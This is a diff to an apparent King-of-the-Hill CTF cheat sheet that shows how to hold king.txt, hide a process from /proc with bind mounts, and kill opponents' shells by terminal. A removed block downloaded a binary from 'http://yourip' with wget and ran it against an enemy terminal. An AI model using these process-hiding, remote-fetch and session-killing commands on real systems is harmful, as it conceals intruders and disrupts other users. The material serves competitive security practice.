@@ -330,6 +330,7 @@ sudo mount -o bind /dev/shm/sqashfs/king.txt /root/king.txt
 sudo rm -rf /dev/shm/root_f 
 
 mkdir /tmp/hidden
+echo "$$" (Show our PID)
 mount -o bind /tmp/hidden /proc/your-PID-here (Hide your PTS)
 
 mkdir /dev/shm/.hidden && mount -o bind /dev/shm/.hidden /proc/$pid (Hide your PTS)
@@ -344,9 +345,6 @@ ln -s ... king.txt
 ```
 ### Kill_enemy_shell ✅
 ```bash
-wget http://yourip/nyancat
-chmod +x nyancat 
-./nyancat > /dev/$pts #replace $pts with pts of enemy
 
 tty (If you're looking for your pts id/number)
 pkill -9 -t pts/<number>
